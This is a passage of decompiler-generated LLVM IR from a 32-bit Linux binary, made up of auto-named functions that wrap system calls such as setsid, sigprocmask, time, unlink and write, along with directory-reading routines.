  br i1 %tmp13, label %dec_label_pc_8052dc2, label %dec_label_pc_8052db6

dec_label_pc_8052db6:                             ; preds = %dec_label_pc_8052d92
  %v1_8052db6 = call i32 @function_80530f9(i32 %v0_8052da2)
  %v0_8052dbb = load i32, i32* %edi.global-to-local, align 4
  %v1_8052dbb = sub i32 0, %v0_8052dbb
  %v2_8052dbd = inttoptr i32 %v1_8052db6 to i32*
  store i32 %v1_8052dbb, i32* %v2_8052dbd, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8052dc6.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052dc2

dec_label_pc_8052dc2:                             ; preds = %dec_label_pc_8052d92, %dec_label_pc_8052db6
  %v2_8052dc6 = phi i32 [ %v0_8052d92, %dec_label_pc_8052d92 ], [ %v2_8052dc6.pre, %dec_label_pc_8052db6 ]
  %v0_8052dc2 = phi i32 [ %v7_8052daa, %dec_label_pc_8052d92 ], [ -1, %dec_label_pc_8052db6 ]
  %v2_8052dc4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052dc4, i32* @edx, align 4
  store i32 %v2_8052dc6, i32* @edi, align 4
  ret i32 %v0_8052dc2

; uselistorder directives
  uselistorder i32 %v7_8052daa, { 1, 0, 2 }
  uselistorder i32 %v0_8052da2, { 1, 0 }
  uselistorder label %dec_label_pc_8052dc2, { 1, 0 }
}

define i32 @function_8052dc8() local_unnamed_addr {
dec_label_pc_8052dc8:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8052dc9 = load i32, i32* @esi, align 4
  store i32 %v0_8052dc9, i32* %stack_var_-8, align 4
  %v0_8052de1 = load i32, i32* @ebx, align 4
  %v1_8052de9 = call i32 @int80_syscall(i32 142)
  store i32 %v0_8052de1, i32* @ebx, align 4
  store i32 %v1_8052de9, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v1_8052de9, -4095
  br i1 %tmp12, label %dec_label_pc_8052e01, label %dec_label_pc_8052df5

dec_label_pc_8052df5:                             ; preds = %dec_label_pc_8052dc8
  %v1_8052df5 = call i32 @function_80530f9(i32 %v0_8052de1)
  %v0_8052dfa = load i32, i32* %esi.global-to-local, align 4
  %v1_8052dfa = sub i32 0, %v0_8052dfa
  %v2_8052dfc = inttoptr i32 %v1_8052df5 to i32*
  store i32 %v1_8052dfa, i32* %v2_8052dfc, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  %v2_8052e04.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8052e01

dec_label_pc_8052e01:                             ; preds = %dec_label_pc_8052dc8, %dec_label_pc_8052df5
  %v2_8052e04 = phi i32 [ %v0_8052dc9, %dec_label_pc_8052dc8 ], [ %v2_8052e04.pre, %dec_label_pc_8052df5 ]
  %v0_8052e01 = phi i32 [ %v1_8052de9, %dec_label_pc_8052dc8 ], [ -1, %dec_label_pc_8052df5 ]
  store i32 %v2_8052e04, i32* @esi, align 4
  ret i32 %v0_8052e01

; uselistorder directives
  uselistorder i32 %v1_8052de9, { 1, 0, 2 }
  uselistorder i32 %v0_8052de1, { 1, 0 }
  uselistorder label %dec_label_pc_8052e01, { 1, 0 }
}

define i32 @function_8052e07() local_unnamed_addr {
dec_label_pc_8052e07:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052e07 = load i32, i32* @ebx, align 4
  store i32 %v0_8052e07, i32* %stack_var_-4, align 4
  %v1_8052e10 = call i32 @setsid(i32 %v0_8052e07)
  store i32 %v1_8052e10, i32* %ebx.global-to-local, align 4
  %tmp7 = icmp ult i32 %v1_8052e10, -4095
  br i1 %tmp7, label %dec_label_pc_8052e27, label %dec_label_pc_8052e1b

dec_label_pc_8052e1b:                             ; preds = %dec_label_pc_8052e07
  %v1_8052e1b = call i32 @function_80530f9(i32 %v0_8052e07)
  %v0_8052e20 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8052e20 = sub i32 0, %v0_8052e20
  %v2_8052e22 = inttoptr i32 %v1_8052e1b to i32*
  store i32 %v1_8052e20, i32* %v2_8052e22, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8052e2b.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052e27

dec_label_pc_8052e27:                             ; preds = %dec_label_pc_8052e07, %dec_label_pc_8052e1b
  %v2_8052e2b = phi i32 [ %v0_8052e07, %dec_label_pc_8052e07 ], [ %v2_8052e2b.pre, %dec_label_pc_8052e1b ]
  %v0_8052e27 = phi i32 [ %v1_8052e10, %dec_label_pc_8052e07 ], [ -1, %dec_label_pc_8052e1b ]
  store i32 %v2_8052e2b, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8052e27

; uselistorder directives
  uselistorder i32 %v1_8052e10, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052e27, { 1, 0 }
}

define i32 @function_8052e2d(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8052e2d:
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  %stack_var_-12 = alloca i32, align 4
  %v0_8052e2e = load i32, i32* @esi, align 4
  %v4_8052e32 = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_8052e32, i32* @ecx, align 4
  %v2_8052e3e = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v2_8052e3e, label %dec_label_pc_8052e57, label %dec_label_pc_8052e42

dec_label_pc_8052e42:                             ; preds = %dec_label_pc_8052e2d
  %tmp11 = icmp ult i32 %arg1, 3
  br i1 %tmp11, label %dec_label_pc_8052e57, label %dec_label_pc_8052e47

dec_label_pc_8052e47:                             ; preds = %dec_label_pc_8052e42
  %v1_8052e47 = call i32 @function_80530f9(i32 %v0_8052e2e)
  %v1_8052e4c = inttoptr i32 %v1_8052e47 to i32*
  store i32 22, i32* %v1_8052e4c, align 4
  br label %dec_label_pc_8052e7e

dec_label_pc_8052e57:                             ; preds = %dec_label_pc_8052e42, %dec_label_pc_8052e2d
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_8052e5c = load i32, i32* @ebx, align 4
  %v7_8052e64 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp3)
  store i32 %v0_8052e5c, i32* @ebx, align 4
  store i32 %v7_8052e64, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v7_8052e64, -4095
  br i1 %tmp12, label %dec_label_pc_8052e7e, label %dec_label_pc_8052e70

dec_label_pc_8052e70:                             ; preds = %dec_label_pc_8052e57
  %v1_8052e70 = call i32 @function_80530f9(i32 %v0_8052e5c)
  %v0_8052e75 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052e75 = sub i32 0, %v0_8052e75
  %v2_8052e77 = inttoptr i32 %v1_8052e70 to i32*
  store i32 %v1_8052e75, i32* %v2_8052e77, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052e7e

dec_label_pc_8052e7e:                             ; preds = %dec_label_pc_8052e70, %dec_label_pc_8052e57, %dec_label_pc_8052e47
  %storemerge = phi i32 [ -1, %dec_label_pc_8052e47 ], [ %v7_8052e64, %dec_label_pc_8052e57 ], [ -1, %dec_label_pc_8052e70 ]
  %v2_8052e7e = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052e7e, i32* @edx, align 4
  store i32 %v0_8052e2e, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v7_8052e64, { 1, 0, 2 }
  uselistorder i32 %v0_8052e5c, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_8052e82(i32* %arg1) local_unnamed_addr {
dec_label_pc_8052e82:
  %edi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052e82 = load i32, i32* @edi, align 4
  store i32 %v0_8052e82, i32* %stack_var_-4, align 4
  store i32 %tmp3, i32* %edi.global-to-local, align 4
  %v0_8052e8a = load i32, i32* @ebx, align 4
  %v2_8052e92 = call i32 @time(i32* %arg1)
  store i32 %v0_8052e8a, i32* @ebx, align 4
  store i32 %v2_8052e92, i32* %edi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v2_8052e92, -4095
  br i1 %tmp10, label %dec_label_pc_8052eaa, label %dec_label_pc_8052e9e

dec_label_pc_8052e9e:                             ; preds = %dec_label_pc_8052e82
  %v1_8052e9e = call i32 @function_80530f9(i32 %v0_8052e8a)
  %v0_8052ea3 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052ea3 = sub i32 0, %v0_8052ea3
  %v2_8052ea5 = inttoptr i32 %v1_8052e9e to i32*
  store i32 %v1_8052ea3, i32* %v2_8052ea5, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8052eae.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052eaa

dec_label_pc_8052eaa:                             ; preds = %dec_label_pc_8052e82, %dec_label_pc_8052e9e
  %v2_8052eae = phi i32 [ %v0_8052e82, %dec_label_pc_8052e82 ], [ %v2_8052eae.pre, %dec_label_pc_8052e9e ]
  %v0_8052eaa = phi i32 [ %v2_8052e92, %dec_label_pc_8052e82 ], [ -1, %dec_label_pc_8052e9e ]
  %v2_8052eac = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8052eac, i32* @edx, align 4
  store i32 %v2_8052eae, i32* @edi, align 4
  ret i32 %v0_8052eaa

; uselistorder directives
  uselistorder i32 %v2_8052e92, { 1, 0, 2 }
  uselistorder i32 %v0_8052e8a, { 1, 0 }
  uselistorder label %dec_label_pc_8052eaa, { 1, 0 }
}

define i32 @function_8052eb0() local_unnamed_addr {
dec_label_pc_8052eb0:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8052eb0 = load i32, i32* @edi, align 4
  store i32 %v0_8052eb0, i32* %stack_var_-4, align 4
  store i32 %tmp, i32* %edi.global-to-local, align 4
  %v0_8052eb8 = load i32, i32* @ebx, align 4
  %v1_8052eb9 = inttoptr i32 %tmp to i8*
  %v3_8052ec0 = call i32 @unlink(i8* %v1_8052eb9)
  store i32 %v0_8052eb8, i32* @ebx, align 4
  store i32 %v3_8052ec0, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v3_8052ec0, -4095
  br i1 %tmp9, label %dec_label_pc_8052ed8, label %dec_label_pc_8052ecc

dec_label_pc_8052ecc:                             ; preds = %dec_label_pc_8052eb0
  %v1_8052ecc = call i32 @function_80530f9(i32 %v0_8052eb8)
  %v0_8052ed1 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052ed1 = sub i32 0, %v0_8052ed1
  %v2_8052ed3 = inttoptr i32 %v1_8052ecc to i32*
  store i32 %v1_8052ed1, i32* %v2_8052ed3, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8052edc.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052ed8

dec_label_pc_8052ed8:                             ; preds = %dec_label_pc_8052eb0, %dec_label_pc_8052ecc
  %v2_8052edc = phi i32 [ %v0_8052eb0, %dec_label_pc_8052eb0 ], [ %v2_8052edc.pre, %dec_label_pc_8052ecc ]
  %v0_8052ed8 = phi i32 [ %v3_8052ec0, %dec_label_pc_8052eb0 ], [ -1, %dec_label_pc_8052ecc ]
  store i32 %v2_8052edc, i32* @edi, align 4
  ret i32 %v0_8052ed8

; uselistorder directives
  uselistorder i32 %v3_8052ec0, { 1, 0, 2 }
  uselistorder i32 %v0_8052eb8, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder label %dec_label_pc_8052ed8, { 1, 0 }
}

define i32 @function_8052ede(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8052ede:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8052ede = load i32, i32* @edi, align 4
  store i32 %v0_8052ede, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8052eee = load i32, i32* @ebx, align 4
  %v4_8052ef6 = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v4_8052ef6, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v4_8052ef6, -4095
  br i1 %tmp12, label %dec_label_pc_8052f0e, label %dec_label_pc_8052f02

dec_label_pc_8052f02:                             ; preds = %dec_label_pc_8052ede
  %v1_8052f02 = call i32 @function_80530f9(i32 %v0_8052eee)
  %v0_8052f07 = load i32, i32* %edi.global-to-local, align 4
  %v1_8052f07 = sub i32 0, %v0_8052f07
  %v2_8052f09 = inttoptr i32 %v1_8052f02 to i32*
  store i32 %v1_8052f07, i32* %v2_8052f09, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  %v2_8052f12.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8052f0e

dec_label_pc_8052f0e:                             ; preds = %dec_label_pc_8052ede, %dec_label_pc_8052f02
  %v2_8052f12 = phi i32 [ %v0_8052ede, %dec_label_pc_8052ede ], [ %v2_8052f12.pre, %dec_label_pc_8052f02 ]
  %v0_8052f0e = phi i32 [ %v4_8052ef6, %dec_label_pc_8052ede ], [ -1, %dec_label_pc_8052f02 ]
  store i32 %v2_8052f12, i32* %edi.global-to-local, align 4
  ret i32 %v0_8052f0e

; uselistorder directives
  uselistorder i32 %v4_8052ef6, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052f0e, { 1, 0 }
}

define i32 @function_8052f14() local_unnamed_addr {
dec_label_pc_8052f14:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-28 = alloca i32, align 4
  %v0_8052f14 = load i32, i32* @edi, align 4
  %v0_8052f15 = load i32, i32* @esi, align 4
  %v0_8052f16 = load i32, i32* @ebx, align 4
  %v12_8052f17 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %tmp, i32* @edi, align 4
  %v1_8052f1e = inttoptr i32 %tmp to i32*
  %v2_8052f1e = load i32, i32* %v1_8052f1e, align 4
  %v12_8052f1e = icmp eq i32 %v2_8052f1e, -1
  %v1_8052f21 = icmp eq i1 %v12_8052f1e, false
  br i1 %v1_8052f21, label %dec_label_pc_8052f33, label %dec_label_pc_8052f23

dec_label_pc_8052f23:                             ; preds = %dec_label_pc_8052f14
  %v1_8052f23 = call i32 @function_80530f9(i32 %v0_8052f16)
  %v1_8052f28 = inttoptr i32 %v1_8052f23 to i32*
  store i32 9, i32* %v1_8052f28, align 4
  br label %dec_label_pc_8052f7d

dec_label_pc_8052f33:                             ; preds = %dec_label_pc_8052f14
  %v1_8052f33 = add i32 %tmp, 24
  store i32 %v12_8052f17, i32* @esi, align 4
  %v2_8052f42 = call i32 @function_8054a80(i32 %v12_8052f17, i32 134564477)
  %v1_8052f4a = call i32 @function_8054a7d(i32 %v1_8052f33)
  store i32 %v1_8052f4a, i32* @eax, align 4
  %v0_8052f4f = load i32, i32* @edi, align 4
  %v1_8052f4f = inttoptr i32 %v0_8052f4f to i32*
  %v2_8052f4f = load i32, i32* %v1_8052f4f, align 4
  store i32 %v2_8052f4f, i32* @ebx, align 4
  store i32 -1, i32* %v1_8052f4f, align 4
  %v2_8052f5c = call i32 @function_8054a80(i32 %v12_8052f17, i32 1)
  %v0_8052f62 = load i32, i32* @edi, align 4
  %v1_8052f62 = add i32 %v0_8052f62, 12
  %v2_8052f62 = inttoptr i32 %v1_8052f62 to i32*
  %v3_8052f62 = load i32, i32* %v2_8052f62, align 4
  %v1_8052f65 = call i32 @function_8054319(i32 %v3_8052f62)
  %v0_8052f6a = load i32, i32* @edi, align 4
  %v1_8052f6d = call i32 @function_8054319(i32 %v0_8052f6a)
  %v0_8052f72 = load i32, i32* @ebx, align 4
  %v1_8052f75 = call i32 @function_8052bc1(i32 %v0_8052f72)
  br label %dec_label_pc_8052f7d

dec_label_pc_8052f7d:                             ; preds = %dec_label_pc_8052f23, %dec_label_pc_8052f33
  %v0_8052f83 = phi i32 [ -1, %dec_label_pc_8052f23 ], [ %v1_8052f75, %dec_label_pc_8052f33 ]
  store i32 %v0_8052f16, i32* @ebx, align 4
  store i32 %v0_8052f15, i32* @esi, align 4
  store i32 %v0_8052f14, i32* @edi, align 4
  ret i32 %v0_8052f83

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052f7d, { 1, 0 }
}

define i32 @function_8052f84(i32 %arg1) local_unnamed_addr {
dec_label_pc_8052f84:
  %eax.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-124 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8052f84 = load i32, i32* @edi, align 4
  %v0_8052f86 = load i32, i32* @ebx, align 4
  store i32 %v0_8052f86, i32* %stack_var_-12, align 4
  store i32 0, i32* @ebx, align 4
  store i32 %arg1, i32* %stack_var_-124, align 4
  %v2_8052f95 = inttoptr i32 %arg1 to i8*
  %v3_8052f95 = call i32 @function_8052cd2(i8* %v2_8052f95, i32 67584)
  store i32 %v3_8052f95, i32* %eax.global-to-local, align 4
  store i32 %v3_8052f95, i32* @edi, align 4
  %v2_8052f9f = icmp slt i32 %v3_8052f95, 0
  br i1 %v2_8052f9f, label %dec_label_pc_805306c, label %dec_label_pc_8052fa7

dec_label_pc_8052fa7:                             ; preds = %dec_label_pc_8052f84
  %v0_8052fa7 = load i32, i32* @ebx, align 4
  %v2_8052fa9 = ptrtoint i32* %stack_var_-100 to i32
  store i32 %v2_8052fa9, i32* %eax.global-to-local, align 4
  store i32 %v3_8052f95, i32* %stack_var_-124, align 4
  %v4_8052faf = call i32 @function_8054e7a(i32 %v3_8052f95, i32 %v2_8052fa9, i32 %v0_8052fa7, i32 %v0_8052fa7)
  store i32 %v4_8052faf, i32* %eax.global-to-local, align 4
  %v2_8052fb7 = icmp slt i32 %v4_8052faf, 0
  br i1 %v2_8052fb7, label %dec_label_pc_8052fcd, label %dec_label_pc_8052fbb

dec_label_pc_8052fbb:                             ; preds = %dec_label_pc_8052fa7
  %v0_8052fc0 = load i32, i32* @edi, align 4
  store i32 %v0_8052fc0, i32* %stack_var_-124, align 4
  %v3_8052fc1 = call i32 @function_8052afd(i32 %v0_8052fc0, i32 2, i32 1)
  store i32 %v3_8052fc1, i32* %eax.global-to-local, align 4
  %v2_8052fc9 = icmp slt i32 %v3_8052fc1, 0
  %v1_8052fcb = icmp eq i1 %v2_8052fc9, false
  br i1 %v1_8052fcb, label %dec_label_pc_8052fe3, label %dec_label_pc_8052fcd

dec_label_pc_8052fcd:                             ; preds = %dec_label_pc_8052fbb, %dec_label_pc_8052fa7
  %v0_8052fcd = load i32, i32* %stack_var_-124, align 4
  %v1_8052fcd = call i32 @function_80530f9(i32 %v0_8052fcd)
  store i32 %v1_8052fcd, i32* %eax.global-to-local, align 4
  store i32 %v1_8052fcd, i32* @ebx, align 4
  %v1_8052fd7 = inttoptr i32 %v1_8052fcd to i32*
  %v2_8052fd7 = load i32, i32* %v1_8052fd7, align 4
  %v0_8052fd9 = load i32, i32* @edi, align 4
  store i32 %v0_8052fd9, i32* %stack_var_-124, align 4
  %v1_8052fda = call i32 @function_8052bc1(i32 %v0_8052fd9)
  store i32 %v1_8052fda, i32* %eax.global-to-local, align 4
  %v1_8052fdf = load i32, i32* @ebx, align 4
  %v2_8052fdf = inttoptr i32 %v1_8052fdf to i32*
  store i32 %v2_8052fd7, i32* %v2_8052fdf, align 4
  br label %dec_label_pc_8053058

dec_label_pc_8052fe3:                             ; preds = %dec_label_pc_8052fbb
  store i32 48, i32* %stack_var_-124, align 4
  %v1_8052fe8 = call i32 @function_8053554(i32 48)
  store i32 %v1_8052fe8, i32* %eax.global-to-local, align 4
  store i32 %v1_8052fe8, i32* @ebx, align 4
  %v1_8052ff2 = icmp eq i32 %v1_8052fe8, 0
  br i1 %v1_8052ff2, label %dec_label_pc_8053044, label %dec_label_pc_8052ff6

dec_label_pc_8052ff6:                             ; preds = %dec_label_pc_8052fe3
  %v0_8052ff6 = load i32, i32* @edi, align 4
  %v2_8052ff6 = inttoptr i32 %v1_8052fe8 to i32*
  store i32 %v0_8052ff6, i32* %v2_8052ff6, align 4
  %v1_8052ff8 = add i32 %v1_8052fe8, 16
  %v2_8052ff8 = inttoptr i32 %v1_8052ff8 to i32*
  store i32 0, i32* %v2_8052ff8, align 4
  %v1_8052fff = add i32 %v1_8052fe8, 8
  %v2_8052fff = inttoptr i32 %v1_8052fff to i32*
  store i32 0, i32* %v2_8052fff, align 4
  %v1_8053006 = add i32 %v1_8052fe8, 4
  %v2_8053006 = inttoptr i32 %v1_8053006 to i32*
  store i32 0, i32* %v2_8053006, align 4
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v1_8053011 = load i32, i32* @ebx, align 4
  %v2_8053011 = add i32 %v1_8053011, 20
  %v3_8053011 = inttoptr i32 %v2_8053011 to i32*
  store i32 %tmp, i32* %v3_8053011, align 4
  %v0_8053014 = load i32, i32* %eax.global-to-local, align 4
  %v6_8053019 = icmp ugt i32 %v0_8053014, 511
  br i1 %v6_8053019, label %dec_label_pc_8053022, label %dec_label_pc_805301b

dec_label_pc_805301b:                             ; preds = %dec_label_pc_8052ff6
  %v0_805301b = load i32, i32* @ebx, align 4
  %v1_805301b = add i32 %v0_805301b, 20
  %v2_805301b = inttoptr i32 %v1_805301b to i32*
  store i32 512, i32* %v2_805301b, align 4
  br label %dec_label_pc_8053022

dec_label_pc_8053022:                             ; preds = %dec_label_pc_8052ff6, %dec_label_pc_805301b
  %v0_8053024 = load i32, i32* @ebx, align 4
  %v1_8053024 = add i32 %v0_8053024, 20
  %v2_8053024 = inttoptr i32 %v1_8053024 to i32*
  %v3_8053024 = load i32, i32* %v2_8053024, align 4
  store i32 1, i32* %stack_var_-124, align 4
  %v3_8053029 = call i32 @function_8053cc8(i64 1, i32 %v3_8053024)
  store i32 %v3_8053029, i32* %eax.global-to-local, align 4
  %v1_8053031 = load i32, i32* @ebx, align 4
  %v2_8053031 = add i32 %v1_8053031, 12
  %v3_8053031 = inttoptr i32 %v2_8053031 to i32*
  store i32 %v3_8053029, i32* %v3_8053031, align 4
  %v1_8053034 = icmp eq i32 %v3_8053029, 0
  %v1_8053036 = icmp eq i1 %v1_8053034, false
  br i1 %v1_8053036, label %dec_label_pc_805305c, label %dec_label_pc_8053038

dec_label_pc_8053038:                             ; preds = %dec_label_pc_8053022
  %v0_805303b = load i32, i32* @ebx, align 4
  store i32 %v0_805303b, i32* %stack_var_-124, align 4
  %v1_805303c = call i32 @function_8054319(i32 %v0_805303b)
  store i32 %v1_805303c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053044

dec_label_pc_8053044:                             ; preds = %dec_label_pc_8052fe3, %dec_label_pc_8053038
  %v0_8053047 = load i32, i32* @edi, align 4
  store i32 %v0_8053047, i32* %stack_var_-124, align 4
  %v1_8053048 = call i32 @function_8052bc1(i32 %v0_8053047)
  store i32 %v1_8053048, i32* %eax.global-to-local, align 4
  %v1_805304d = call i32 @function_80530f9(i32 %v0_8053047)
  store i32 %v1_805304d, i32* %eax.global-to-local, align 4
  %v1_8053052 = inttoptr i32 %v1_805304d to i32*
  store i32 12, i32* %v1_8053052, align 4
  br label %dec_label_pc_8053058

dec_label_pc_8053058:                             ; preds = %dec_label_pc_8052fcd, %dec_label_pc_8053044
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8053069

dec_label_pc_805305c:                             ; preds = %dec_label_pc_8053022
  %v0_805305e = load i32, i32* @ebx, align 4
  %v1_805305e = add i32 %v0_805305e, 24
  store i32 %v1_805305e, i32* %eax.global-to-local, align 4
  store i32 %v1_805305e, i32* %stack_var_-124, align 4
  %v1_8053064 = call i32 @function_8054a7d(i32 %v1_805305e)
  store i32 %v1_8053064, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053069

dec_label_pc_8053069:                             ; preds = %dec_label_pc_8053058, %dec_label_pc_805305c
  %v2_8053071.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_805306c

dec_label_pc_805306c:                             ; preds = %dec_label_pc_8052f84, %dec_label_pc_8053069
  %v2_8053071 = phi i32 [ %v0_8052f86, %dec_label_pc_8052f84 ], [ %v2_8053071.pre, %dec_label_pc_8053069 ]
  %v0_805306f = load i32, i32* @ebx, align 4
  store i32 %v0_805306f, i32* %eax.global-to-local, align 4
  store i32 %v2_8053071, i32* @ebx, align 4
  store i32 %v0_8052f84, i32* @edi, align 4
  ret i32 %v0_805306f

; uselistorder directives
  uselistorder i32 %v3_8053029, { 1, 0, 2 }
  uselistorder i32 %v1_8052fe8, { 2, 3, 5, 4, 1, 0, 6 }
  uselistorder i32 %v1_8052fcd, { 1, 0, 2 }
  uselistorder i32 %v3_8052f95, { 1, 0, 3, 2, 4 }
  uselistorder i32* %stack_var_-124, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 (i64, i32)* @function_8053cc8, { 1, 0, 2 }
  uselistorder i32 512, { 3, 1, 2, 0 }
  uselistorder i32 (i32)* @function_8052bc1, { 11, 10, 9, 22, 21, 18, 17, 20, 16, 19, 15, 14, 13, 12, 5, 4, 8, 7, 6, 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805306c, { 1, 0 }
  uselistorder label %dec_label_pc_8053069, { 1, 0 }
  uselistorder label %dec_label_pc_8053058, { 1, 0 }
  uselistorder label %dec_label_pc_8053044, { 1, 0 }
  uselistorder label %dec_label_pc_8053022, { 1, 0 }
}

define i32 @function_8053075() local_unnamed_addr {
dec_label_pc_8053075:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8053075 = load i32, i32* @esi, align 4
  %v0_8053076 = load i32, i32* @ebx, align 4
  store i32 %v0_8053076, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* @esi, align 4
  %v1_805307e = add i32 %tmp, 24
  store i32 %v1_805307e, i32* @ebx, align 4
  %v2_8053087 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8053087, i32* @eax, align 4
  %v2_805308c = call i32 @function_8054a80(i32 %v2_8053087, i32 134564477)
  %v0_8053091 = load i32, i32* @ebx, align 4
  %v1_8053094 = call i32 @function_8054a7d(i32 %v0_8053091)
  br label %dec_label_pc_805309c

dec_label_pc_805309c:                             ; preds = %dec_label_pc_80530c7, %dec_label_pc_8053075
  %v0_805309c = load i32, i32* @esi, align 4
  %v1_805309c = add i32 %v0_805309c, 8
  %v2_805309c = inttoptr i32 %v1_805309c to i32*
  %v3_805309c = load i32, i32* %v2_805309c, align 4
  %v2_805309f = add i32 %v0_805309c, 4
  %v3_805309f = inttoptr i32 %v2_805309f to i32*
  %v4_805309f = load i32, i32* %v3_805309f, align 4
  %v6_80530a2 = icmp ugt i32 %v3_805309c, %v4_805309f
  br i1 %v6_80530a2, label %dec_label_pc_80530c7, label %dec_label_pc_80530a4

dec_label_pc_80530a4:                             ; preds = %dec_label_pc_805309c
  %v0_80530a4 = load i32, i32* @edx, align 4
  %v1_80530a5 = add i32 %v0_805309c, 20
  %v2_80530a5 = inttoptr i32 %v1_80530a5 to i32*
  %v3_80530a5 = load i32, i32* %v2_80530a5, align 4
  %v1_80530a8 = add i32 %v0_805309c, 12
  %v2_80530a8 = inttoptr i32 %v1_80530a8 to i32*
  %v3_80530a8 = load i32, i32* %v2_80530a8, align 4
  %v1_80530ab = inttoptr i32 %v0_805309c to i32*
  %v2_80530ab = load i32, i32* %v1_80530ab, align 4
  %v4_80530ad = call i32 @function_8054ec2(i32 %v2_80530ab, i32 %v3_80530a8, i32 %v3_80530a5, i32 %v0_80530a4)
  %tmp12 = icmp slt i32 %v4_80530ad, 1
  %tmp13 = icmp eq i1 %tmp12, false
  br i1 %tmp13, label %dec_label_pc_80530bd, label %dec_label_pc_80530b9

dec_label_pc_80530b9:                             ; preds = %dec_label_pc_80530a4
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_80530e3

dec_label_pc_80530bd:                             ; preds = %dec_label_pc_80530a4
  %v1_80530bd = load i32, i32* @esi, align 4
  %v2_80530bd = add i32 %v1_80530bd, 8
  %v3_80530bd = inttoptr i32 %v2_80530bd to i32*
  store i32 %v4_80530ad, i32* %v3_80530bd, align 4
  %v0_80530c0 = load i32, i32* @esi, align 4
  %v1_80530c0 = add i32 %v0_80530c0, 4
  %v2_80530c0 = inttoptr i32 %v1_80530c0 to i32*
  store i32 0, i32* %v2_80530c0, align 4
  %v0_80530c7.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80530c7

dec_label_pc_80530c7:                             ; preds = %dec_label_pc_805309c, %dec_label_pc_80530bd
  %v1_80530d5 = phi i32 [ %v0_805309c, %dec_label_pc_805309c ], [ %v0_80530c7.pre, %dec_label_pc_80530bd ]
  %v1_80530c7 = add i32 %v1_80530d5, 4
  %v2_80530c7 = inttoptr i32 %v1_80530c7 to i32*
  %v3_80530c7 = load i32, i32* %v2_80530c7, align 4
  %v2_80530cc = add i32 %v1_80530d5, 12
